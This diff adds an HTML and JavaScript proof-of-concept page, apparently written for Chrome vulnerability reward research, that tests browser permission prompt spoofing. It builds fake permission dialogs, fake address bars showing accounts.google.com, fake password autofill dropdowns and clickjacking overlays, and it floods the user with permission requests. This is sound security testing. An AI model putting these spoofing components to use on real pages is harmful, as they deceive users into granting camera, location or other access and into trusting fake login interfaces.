@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+<!--
+  Permission Prompt Spoofing PoCs - Chrome VRP Security Research
+  ===============================================================
+  Tests for permission prompt UI spoofing/confusion attacks.
+  These test whether a malicious page can trick users into
+  granting permissions by obscuring or mimicking the browser's
+  permission dialog.
+
+  Serve from localhost:8888.
+-->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Permission Prompt Spoofing PoCs - Chrome VRP</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Courier New', monospace;
+    background: #0a0a12;
+    color: #ccc;
+    padding: 20px;
+  }
+  h1 { color: #ff5252; font-size: 1.3em; margin-bottom: 8px; }
+  h2 { color: #ffab40; font-size: 1em; margin: 10px 0 4px; }
+  .controls {
+    background: #161625;
+    padding: 12px;
+    border-radius: 6px;
+    margin-bottom: 15px;
+    border-left: 3px solid #7c4dff;
+  }
+  button {
+    background: #ff5252;
+    color: white;
+    border: none;
+    padding: 8px 16px;
+    cursor: pointer;
+    font-family: monospace;
+    border-radius: 4px;
+    margin: 3px;
+    font-size: 0.9em;
+  }
+  button:hover { background: #ff8a80; }
+  button.secondary { background: #7c4dff; }
+  button.secondary:hover { background: #b388ff; }
+  #results {
+    max-height: 60vh;
+    overflow-y: auto;
+    background: #111;
+    padding: 10px;
+    border-radius: 6px;
+  }
+  .test-group {
+    border: 1px solid #333;
+    margin: 8px 0;
+    padding: 8px;
+    border-radius: 4px;
+  }
+  .result { padding: 2px 6px; margin: 1px 0; font-size: 0.82em; }
+  .SAFE { color: #2ecc71; }
+  .SUSPICIOUS { color: #f39c12; }
+  .VULNERABLE { color: #e74c3c; }
+  .INFO { color: #3498db; }
+  .progress { color: #7c4dff; margin: 8px 0; font-size: 0.9em; }
+
+  /* Fake Chrome permission prompt overlay */
+  .fake-prompt-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.5);
+    z-index: 999999;
+  }
+  .fake-prompt {
+    position: fixed;
+    top: 80px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #292a2d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    width: 380px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    font-size: 13px;
+    color: #e8eaed;
+    z-index: 1000000;
+  }
+  .fake-prompt .origin {
+    font-weight: 600;
+    color: #8ab4f8;
+    margin-bottom: 8px;
+  }
+  .fake-prompt .message { margin-bottom: 12px; line-height: 1.4; }
+  .fake-prompt .buttons {
+    display: flex;
+    justify-content: flex-end;
+    gap: 8px;
+  }
+  .fake-prompt .btn-allow {
+    background: #8ab4f8;
+    color: #202124;
+    border: none;
+    padding: 6px 16px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-weight: 600;
+    font-size: 13px;
+  }
+  .fake-prompt .btn-block {
+    background: transparent;
+    color: #8ab4f8;
+    border: 1px solid #5f6368;
+    padding: 6px 16px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 13px;
+  }
+</style>
+</head>
+<body>
+
+<h1>Permission Prompt Spoofing PoCs</h1>
+<p style="color:#666;margin-bottom:12px;">Chrome VRP - UI Security / Social Engineering Tests</p>
+
+<div class="controls">
+  <p style="color:#aaa;margin-bottom:8px;">Individual Tests:</p>
+  <button onclick="testFullscreenOverlay()">1. Fullscreen Overlay</button>
+  <button onclick="testPiPSpoofing()">2. PiP Spoofing</button>
+  <button onclick="testNotificationSpoof()">3. Notification Spoof</button>
+  <button onclick="testRapidOriginSwitch()">4. Rapid Origin Switch</button>
+  <button onclick="testMultiplePermissions()">5. Multiple Permissions</button>
+  <button onclick="testCSSOverlay()">6. CSS Overlay</button>
+  <br><br>
+  <button class="secondary" onclick="runAllTests()">Run All Tests</button>
+  <button class="secondary" onclick="clearResults()">Clear Results</button>
+</div>
+
+<div class="progress" id="progress"></div>
+<div id="results"></div>
+
+<!-- Fake permission prompt overlay (for testing) -->
+<div class="fake-prompt-overlay" id="fakeOverlay">
+  <div class="fake-prompt" id="fakePrompt">
+    <div class="origin" id="fakeOrigin">localhost:8888</div>
+    <div class="message" id="fakeMessage">wants to use your camera</div>
+    <div class="buttons">
+      <button class="btn-block" onclick="dismissFakePrompt()">Block</button>
+      <button class="btn-allow" onclick="onFakeAllow()">Allow</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const resultsDiv = document.getElementById('results');
+let groupDiv = null;
+
+function clearResults() {
+  resultsDiv.innerHTML = '';
+  document.getElementById('progress').textContent = '';
+}
+
+function startGroup(name) {
+  groupDiv = document.createElement('div');
+  groupDiv.className = 'test-group';
+  groupDiv.innerHTML = `<h2>${name}</h2>`;
+  resultsDiv.appendChild(groupDiv);
+}
+
+function log(severity, msg) {
+  const div = document.createElement('div');
+  div.className = `result ${severity}`;
+  const icons = { SAFE:'🟢', SUSPICIOUS:'🟡', VULNERABLE:'🔴', INFO:'ℹ️' };
+  div.textContent = `${icons[severity]||''} [${severity}] ${msg}`;
+  (groupDiv || resultsDiv).appendChild(div);
+}
+
+function setProgress(m) { document.getElementById('progress').textContent = m; }
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+function showFakePrompt(origin, message) {
+  document.getElementById('fakeOrigin').textContent = origin;
+  document.getElementById('fakeMessage').textContent = message;
+  document.getElementById('fakeOverlay').style.display = 'block';
+}
+
+function dismissFakePrompt() {
+  document.getElementById('fakeOverlay').style.display = 'none';
+}
+
+let fakeAllowCallback = null;
+function onFakeAllow() {
+  dismissFakePrompt();
+  if (fakeAllowCallback) fakeAllowCallback();
+}
+
+// ============================================================
+// 1. Fullscreen Overlay During Permission Prompt
+// ============================================================
+async function testFullscreenOverlay() {
+  startGroup('1. Fullscreen Overlay During Permission Prompt');
+
+  log('INFO', 'Testing fullscreen API for overlay creation during permission prompts');
+
+  // Test 1: Can we enter fullscreen?
+  try {
+    // Request fullscreen (requires user gesture in real scenario)
+    const canFullscreen = !!(document.documentElement.requestFullscreen || 
+                            document.documentElement.webkitRequestFullscreen);
+    log('INFO', `Fullscreen API available: ${canFullscreen}`);
+
+    if (canFullscreen) {
+      log('INFO', 'Attempting fullscreen... (requires user gesture)');
+      
+      // Create a fullscreen overlay that mimics the browser chrome
+      const overlay = document.createElement('div');
+      overlay.id = 'fs-overlay-test';
+      overlay.style.cssText = `
+        position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+        background: white; z-index: 2147483647;
+        display: none;
+      `;
+      
+      // Fake address bar
+      overlay.innerHTML = `
+        <div style="background:#dee1e6;height:72px;display:flex;align-items:center;padding:0 16px;">
+          <div style="display:flex;align-items:center;gap:8px;width:100%;">
+            <div style="width:24px;height:24px;background:#5f6368;border-radius:50%;"></div>
+            <div style="flex:1;background:white;border-radius:24px;height:36px;display:flex;align-items:center;padding:0 16px;">
+              <span style="color:#5f6368;font-family:system-ui;font-size:14px;">
+                <span style="color:#188038;">🔒</span> https://accounts.google.com/signin
+              </span>
+            </div>
+          </div>
+        </div>
+        <div style="padding:40px;text-align:center;font-family:system-ui;">
+          <p style="font-size:18px;color:#333;">This is a simulated fullscreen overlay</p>
+          <p style="font-size:14px;color:#666;margin-top:10px;">
+            In a real attack, this would show a fake browser UI with a spoofed URL bar
+            while the real permission prompt appears underneath.
+          </p>
+        </div>
+      `;
+      document.body.appendChild(overlay);
+
+      // Try to go fullscreen and show overlay simultaneously
+      try {
+        const fsPromise = document.documentElement.requestFullscreen?.() || 
+                          document.documentElement.webkitRequestFullscreen?.();
+        
+        if (fsPromise) {
+          overlay.style.display = 'block';
+          await fsPromise;
+          
+          // Request permission while in fullscreen
+          log('SUSPICIOUS', 'Entered fullscreen — overlay could obscure permission prompt');
+          
+          // Check if Chrome shows fullscreen warning
+          log('INFO', 'Chrome should show "Press Esc to exit full screen" notification');
+          
+          await sleep(2000);
+          
+          // Exit fullscreen
+          if (document.exitFullscreen) await document.exitFullscreen();
+          else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+        }
+      } catch (e) {
+        log('SAFE', `Fullscreen request rejected: ${e.message}`);
+      }
+
+      overlay.style.display = 'none';
+      overlay.remove();
+    }
+  } catch (e) {
+    log('INFO', `Fullscreen test error: ${e.message}`);
+  }
+
+  // Test 2: Can we detect when fullscreen warning disappears?
+  try {
+    const handler = () => {
+      if (document.fullscreenElement) {
+        log('INFO', 'Entered fullscreen mode');
+      } else {
+        log('INFO', 'Exited fullscreen mode');
+      }
+    };
+    document.addEventListener('fullscreenchange', handler);
+    
+    // Clean up
+    setTimeout(() => document.removeEventListener('fullscreenchange', handler), 5000);
+  } catch (e) {}
+
+  // Test 3: Pointer lock during permission prompt
+  try {
+    log('INFO', 'Pointer Lock API available: ' + !!document.documentElement.requestPointerLock);
+    
+    if (document.documentElement.requestPointerLock) {
+      log('SUSPICIOUS', 'Pointer lock could prevent user from clicking "Block" on permission prompt');
+    }
+  } catch (e) {}
+}
+
+// ============================================================
+// 2. Picture-in-Picture Window Spoofing
+// ============================================================
+async function testPiPSpoofing() {
+  startGroup('2. Picture-in-Picture Window Spoofing');
+
+  // Test 1: Document PiP API
+  try {
+    if ('documentPictureInPicture' in window) {
+      log('SUSPICIOUS', 'Document Picture-in-Picture API available — can create arbitrary PiP windows');
+      
+      try {
+        // Would need user gesture in practice
+        const pip = await window.documentPictureInPicture.requestWindow({
+          width: 400,
+          height: 300,
+        });
+
+        // Inject fake permission dialog into PiP window
+        pip.document.body.innerHTML = `
+          <div style="font-family:system-ui;padding:20px;background:#292a2d;color:#e8eaed;height:100%;">
+            <div style="font-weight:600;color:#8ab4f8;margin-bottom:12px;">
+              accounts.google.com
+            </div>
+            <p style="margin-bottom:16px;">wants to access your microphone</p>
+            <div style="text-align:right;">
+              <button style="background:transparent;color:#8ab4f8;border:1px solid #5f6368;padding:6px 16px;border-radius:4px;cursor:pointer;margin-right:8px;">Block</button>
+              <button style="background:#8ab4f8;color:#202124;border:none;padding:6px 16px;border-radius:4px;cursor:pointer;font-weight:600;">Allow</button>
+            </div>
+          </div>`;
+
+        log('VULNERABLE', 'Created PiP window with fake permission dialog');
+
+        await sleep(3000);
+        pip.close();
+      } catch (e) {
+        log('SAFE', `PiP window creation blocked: ${e.message}`);
+      }
+    } else {
+      log('INFO', 'Document PiP API not available');
+    }
+  } catch (e) {}
+
+  // Test 2: Video PiP with overlaid content
+  try {
+    const video = document.createElement('video');
+    video.style.display = 'none';
+    
+    // Create a canvas-based video source
+    const canvas = document.createElement('canvas');
+    canvas.width = 400;
+    canvas.height = 300;
+    const ctx = canvas.getContext('2d');
+    
+    // Draw fake permission dialog
+    ctx.fillStyle = '#292a2d';
+    ctx.fillRect(0, 0, 400, 300);
+    ctx.font = '600 14px system-ui';
+    ctx.fillStyle = '#8ab4f8';
+    ctx.fillText('secure-bank.com', 20, 30);
+    ctx.font = '13px system-ui';
+    ctx.fillStyle = '#e8eaed';
+    ctx.fillText('wants to show notifications', 20, 55);
+    ctx.fillText('[Block]  [Allow]', 260, 280);
+
+    try {
+      const stream = canvas.captureStream(1);
+      video.srcObject = stream;
+      document.body.appendChild(video);
+      
+      await video.play().catch(() => {});
+
+      if (video.requestPictureInPicture) {
+        try {
+          const pipWindow = await video.requestPictureInPicture();
+          log('SUSPICIOUS', 'Created video PiP with fake permission dialog content');
+          
+          pipWindow.addEventListener('resize', (e) => {
+            log('INFO', `PiP window resized to ${pipWindow.width}x${pipWindow.height}`);
+          });
+
+          await sleep(2000);
+          await document.exitPictureInPicture().catch(() => {});
+        } catch (e) {
+          log('SAFE', `Video PiP blocked: ${e.message}`);
+        }
+      } else {
+        log('INFO', 'Video PiP API not available');
+      }
+      
+      video.remove();
+    } catch (e) {
+      log('INFO', `Video PiP test: ${e.message}`);
+    }
+  } catch (e) {}
+}
+
+// ============================================================
+// 3. Notification as Fake Permission Dialog
+// ============================================================
+async function testNotificationSpoof() {
+  startGroup('3. Notification-Based Permission Spoofing');
+
+  // Test 1: Check notification permission and create convincing notification
+  try {
+    const perm = Notification.permission;
+    log('INFO', `Current notification permission: ${perm}`);
+
+    if (perm === 'granted') {
+      // Create a notification that looks like a permission prompt
+      const notification = new Notification('Security check required', {
+        body: 'Click "Allow" to verify your identity\nsecure-bank.example.com needs camera access',
+        icon: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzhBQjRGOCIgZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bS0xIDE1SDlWOWg0djhoLTJ6bTAtMTBIOXYyaDJWN3oiLz48L3N2Zz4=',
+        requireInteraction: true,
+        tag: 'fake-permission-' + Date.now(),
+      });
+
+      notification.onclick = () => {
+        log('SUSPICIOUS', 'User clicked fake permission notification');
+        notification.close();
+      };
+
+      log('SUSPICIOUS', 'Created notification mimicking permission prompt');
+
+      setTimeout(() => notification.close(), 5000);
+    } else if (perm === 'default') {
+      log('INFO', 'Would need to request notification permission first');
+      
+      // The request itself could be confusing
+      try {
+        const result = await Notification.requestPermission();
+        log('INFO', `Notification permission result: ${result}`);
+      } catch (e) {
+        log('INFO', `Notification request: ${e.message}`);
+      }
+    } else {
+      log('SAFE', 'Notifications are blocked — cannot create fake prompts');
+    }
+  } catch (e) {
+    log('INFO', `Notification test: ${e.message}`);
+  }
+
+  // Test 2: Timing attack — can we detect when a real permission prompt is shown?
+  try {
+    log('INFO', 'Testing if permission prompt display is detectable...');
+    
+    const before = performance.now();
+    // requestAnimationFrame timing can detect UI thread blocking
+    const frameTimes = [];
+    let frameCount = 0;
+    
+    function measureFrames() {
+      const now = performance.now();
+      frameTimes.push(now);
+      frameCount++;
+      if (frameCount < 60) requestAnimationFrame(measureFrames);
+    }
+    requestAnimationFrame(measureFrames);
+    
+    await sleep(1100);
+    
+    // Analyze frame timing regularity
+    let maxGap = 0;
+    for (let i = 1; i < frameTimes.length; i++) {
+      const gap = frameTimes[i] - frameTimes[i-1];
+      if (gap > maxGap) maxGap = gap;
+    }
+    
+    log('INFO', `Frame timing: max gap = ${maxGap.toFixed(2)}ms over ${frameTimes.length} frames`);
+    if (maxGap > 100) {
+      log('SUSPICIOUS', 'Large frame gap detected — could indicate permission prompt display');
+    }
+  } catch (e) {}
+}
+
+// ============================================================
+// 4. Rapid Origin Switching During Permission Prompt
+// ============================================================
+async function testRapidOriginSwitch() {
+  startGroup('4. Rapid Origin Switching');
+
+  // Test 1: Navigate iframe rapidly while requesting permission
+  try {
+    log('INFO', 'Testing rapid navigation during permission requests...');
+    
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
+    document.body.appendChild(iframe);
+
+    const origins = [
+      'https://example.com',
+      'https://example.org',
+      'https://test.example.com',
+      'data:text/html,<h1>test</h1>',
+      'about:blank',
+    ];
+
+    // Rapid navigation
+    for (let i = 0; i < 20; i++) {
+      iframe.src = origins[i % origins.length] + '?t=' + Date.now() + '_' + i;
+      await sleep(50);
+    }
+
+    log('INFO', 'Rapid iframe navigation complete');
+    
+    // Check if any navigation is still pending
+    try {
+      const currentSrc = iframe.src;
+      log('INFO', `Final iframe src: ${currentSrc.substring(0, 80)}`);
+    } catch (e) {}
+
+    iframe.remove();
+  } catch (e) {
+    log('INFO', `Rapid navigation test: ${e.message}`);
+  }
+
+  // Test 2: window.open + rapid location changes
+  try {
+    const win = window.open('about:blank', '_blank', 'width=100,height=100');
+    if (win) {
+      // Rapidly change location
+      const urls = [
+        'about:blank',
+        'data:text/html,<script>document.title="Loading..."</script>',
+        'javascript:void(0)',
+      ];
+
+      for (let i = 0; i < 10; i++) {
+        try {
+          win.location = urls[i % urls.length];
+        } catch (e) {}
+        await sleep(10);
+      }
+
+      log('INFO', 'Rapid window location changes complete');
+      
+      // Try to access after location changes
+      try {
+        log('INFO', `Window closed: ${win.closed}`);
+      } catch (e) {}
+
+      win.close();
+    } else {
+      log('INFO', 'Popup blocked — cannot test rapid origin switching');
+    }
+  } catch (e) {
+    log('INFO', `Window origin switch: ${e.message}`);
+  }
+
+  // Test 3: history.pushState/replaceState origin confusion
+  try {
+    const originalURL = location.href;
+    
+    // Can we change the displayed URL to look like another origin?
+    try {
+      history.pushState({}, '', '/accounts/google/signin');
+      log('INFO', `URL changed to: ${location.href}`);
+      
+      // This could make the origin in a permission prompt look different
+      // than what the user expects
+      log('SUSPICIOUS', 'URL bar shows modified path — could confuse users during permission prompts');
+      
+      // Restore
+      history.replaceState({}, '', originalURL.replace(location.origin, ''));
+    } catch (e) {
+      log('SAFE', `pushState restricted: ${e.message}`);
+    }
+  } catch (e) {}
+}
+
+// ============================================================
+// 5. Multiple Permission Requests
+// ============================================================
+async function testMultiplePermissions() {
+  startGroup('5. Multiple Permission Request Confusion');
+
+  // Test 1: Request multiple permissions rapidly
+  try {
+    const permissions = [
+      { name: 'geolocation', fn: () => navigator.geolocation.getCurrentPosition(() => {}, () => {}) },
+      { name: 'notifications', fn: () => Notification.requestPermission() },
+      { name: 'camera', fn: () => navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {}) },
+      { name: 'microphone', fn: () => navigator.mediaDevices.getUserMedia({ audio: true }).catch(() => {}) },
+      { name: 'clipboard-read', fn: () => navigator.clipboard.readText().catch(() => {}) },
+    ];
+
+    // Check current permission states
+    for (const p of permissions) {
+      try {
+        const status = await navigator.permissions.query({ name: p.name });
+        log('INFO', `${p.name}: ${status.state}`);
+      } catch (e) {
+        log('INFO', `${p.name}: query not supported`);
+      }
+    }
+
+    // Request multiple permissions at once
+    log('INFO', 'Requesting multiple permissions simultaneously...');
+    
+    const promises = permissions.map(p => {
+      try {
+        return p.fn();
+      } catch (e) {
+        return Promise.resolve();
+      }
+    });
+
+    // If multiple prompts appear, user might click "Allow" on wrong one
+    setTimeout(async () => {
+      try {
+        await Promise.allSettled(promises);
+        log('INFO', 'All permission requests settled');
+      } catch (e) {}
+    }, 100);
+
+    log('SUSPICIOUS', 
+      'Multiple permission requests fired — Chrome should queue them but user may be confused');
+    
+    await sleep(2000);
+  } catch (e) {
+    log('INFO', `Multiple permissions test: ${e.message}`);
+  }
+
+  // Test 2: Permission request immediately after user interaction
+  try {
+    log('INFO', 'Testing permission request chaining after user action...');
+    
+    // Simulate: user clicks a button, page requests permission A,
+    // then immediately takes action and requests permission B
+    const btn = document.createElement('button');
+    btn.textContent = 'Test Permission Chain';
+    btn.style.cssText = 'position:fixed;bottom:100px;right:20px;z-index:999;';
+    btn.onclick = async () => {
+      // First permission
+      navigator.geolocation.getCurrentPosition(() => {}, () => {});
+      // Immediately request second
+      await sleep(100);
+      try {
+        await Notification.requestPermission();
+      } catch (e) {}
+      btn.remove();
+    };
+    document.body.appendChild(btn);
+    
+    log('INFO', 'Click "Test Permission Chain" button to test');
+    
+    await sleep(1000);
+    try { btn.remove(); } catch (e) {}
+  } catch (e) {}
+}
+
+// ============================================================
+// 6. CSS Overlay on Chrome UI Elements
+// ============================================================
+async function testCSSOverlay() {
+  startGroup('6. CSS Overlay / UI Spoofing');
+
+  // Test 1: Position elements to overlap with browser UI
+  try {
+    // Create element positioned at the very top of viewport
+    const topBar = document.createElement('div');
+    topBar.style.cssText = `
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: 40px;
+      background: #dee1e6;
+      z-index: 2147483647;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      font-family: system-ui;
+      font-size: 14px;
+    `;
+    topBar.innerHTML = `
+      <span style="color:#5f6368;">←</span>
+      <span style="margin:0 12px;color:#5f6368;">→</span>
+      <span style="color:#5f6368;">↻</span>
+      <div style="flex:1;margin:0 16px;background:white;border-radius:20px;height:28px;display:flex;align-items:center;padding:0 12px;">
+        <span style="color:#188038;margin-right:6px;">🔒</span>
+        <span style="color:#333;">https://accounts.google.com/secure</span>
+      </div>
+    `;
+    document.body.appendChild(topBar);
+    
+    log('SUSPICIOUS', 'Created UI element at window top — could overlap address bar in some configurations');
+    
+    // Check if the element is visible at y=0
+    const rect = topBar.getBoundingClientRect();
+    log('INFO', `Top bar position: top=${rect.top}, visible=${rect.top >= 0}`);
+    
+    await sleep(1000);
+    topBar.remove();
+  } catch (e) {}
+
+  // Test 2: Fake autocomplete/dropdown overlay
+  try {
+    const dropdown = document.createElement('div');
+    dropdown.style.cssText = `
+      position: fixed;
+      top: 50px; left: 100px;
+      width: 350px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+      z-index: 2147483647;
+      font-family: system-ui;
+      font-size: 14px;
+      padding: 8px 0;
+    `;
+    dropdown.innerHTML = `
+      <div style="padding:8px 16px;cursor:pointer;display:flex;align-items:center;gap:12px;" 
+           onmouseover="this.style.background='#f0f0f0'" onmouseout="this.style.background='white'">
+        <span>🔒</span>
+        <div>
+          <div style="color:#333;">admin@example.com</div>
+          <div style="color:#888;font-size:12px;">Password saved</div>
+        </div>
+      </div>
+      <div style="padding:8px 16px;cursor:pointer;display:flex;align-items:center;gap:12px;"
+           onmouseover="this.style.background='#f0f0f0'" onmouseout="this.style.background='white'">
+        <span>🔒</span>
+        <div>
+          <div style="color:#333;">user@company.com</div>
+          <div style="color:#888;font-size:12px;">Password saved</div>
+        </div>
+      </div>
+    `;
+    document.body.appendChild(dropdown);
+    
+    log('SUSPICIOUS', 'Created fake credential autofill dropdown — could trick users');
+    
+    await sleep(2000);
+    dropdown.remove();
+  } catch (e) {}
+
+  // Test 3: Test CSS zoom/transform to position content outside viewport
+  try {
+    const overflowTest = document.createElement('div');
+    overflowTest.style.cssText = `
+      position: fixed;
+      top: -100px;
+      left: 0;
+      width: 100vw;
+      height: 200px;
+      background: red;
+      z-index: 2147483647;
+      transform: translateY(100px);
+    `;
+    document.body.appendChild(overflowTest);
+    
+    const visible = overflowTest.getBoundingClientRect().top >= 0;
+    log('INFO', `Transform-shifted element visible: ${visible}`);
+    
+    if (visible) {
+      log('SUSPICIOUS', 'Element repositioned via CSS transform could overlap browser UI');
+    } else {
+      log('SAFE', 'Transformed element still clipped by browser chrome');
+    }
+    
+    overflowTest.remove();
+  } catch (e) {}
+
+  // Test 4: Fake permission prompt via CSS
+  try {
+    showFakePrompt('secure-bank.example.com', 'wants to access your location');
+    log('SUSPICIOUS', 'Displayed fake permission prompt via DOM — visually identical to real one');
+    
+    // Check if user can distinguish from real prompt
+    log('INFO', 'Real Chrome prompts appear outside the page viewport (in browser UI)');
+    log('INFO', 'But fullscreen mode could make fake prompts indistinguishable');
+    
+    await sleep(2000);
+    dismissFakePrompt();
+  } catch (e) {}
+
+  // Test 5: Scrollbar spoofing
+  try {
+    const fakeScrollbar = document.createElement('div');
+    fakeScrollbar.style.cssText = `
+      position: fixed;
+      top: 0; right: 0;
+      width: 17px;
+      height: 100vh;
+      background: #f1f1f1;
+      z-index: 2147483647;
+    `;
+    const thumb = document.createElement('div');
+    thumb.style.cssText = `
+      width: 17px;
+      height: 100px;
+      background: #888;
+      border-radius: 8px;
+      position: relative;
+      top: 30%;
+    `;
+    fakeScrollbar.appendChild(thumb);
+    document.body.appendChild(fakeScrollbar);
+    
+    log('INFO', 'Created fake scrollbar overlay — could be used for click-jacking');
+    
+    await sleep(1000);
+    fakeScrollbar.remove();
+  } catch (e) {}
+}
+
+// ============================================================
+// Run All Tests
+// ============================================================
+async function runAllTests() {
+  clearResults();
+  const start = performance.now();
+  
+  const tests = [
+    ['Fullscreen Overlay', testFullscreenOverlay],
+    ['PiP Spoofing', testPiPSpoofing],
+    ['Notification Spoof', testNotificationSpoof],
+    ['Rapid Origin Switch', testRapidOriginSwitch],
+    ['Multiple Permissions', testMultiplePermissions],
+    ['CSS Overlay', testCSSOverlay],
+  ];
+
+  for (let i = 0; i < tests.length; i++) {
+    setProgress(`Running ${i+1}/${tests.length}: ${tests[i][0]}...`);
+    try { await tests[i][1](); } catch (e) {
+      log('INFO', `Test "${tests[i][0]}" error: ${e.message}`);
+    }
+    await sleep(300);
+  }
+
+  const elapsed = ((performance.now() - start) / 1000).toFixed(1);
+  setProgress(`Complete in ${elapsed}s`);
+
+  startGroup('Summary');
+  let safe = 0, suspicious = 0, vulnerable = 0;
+  document.querySelectorAll('.result').forEach(r => {
+    if (r.classList.contains('SAFE')) safe++;
+    if (r.classList.contains('SUSPICIOUS')) suspicious++;
+    if (r.classList.contains('VULNERABLE')) vulnerable++;
+  });
+  log('INFO', `🟢 SAFE: ${safe} | 🟡 SUSPICIOUS: ${suspicious} | 🔴 VULNERABLE: ${vulnerable}`);
+}
+</script>
+</body>
+</html>
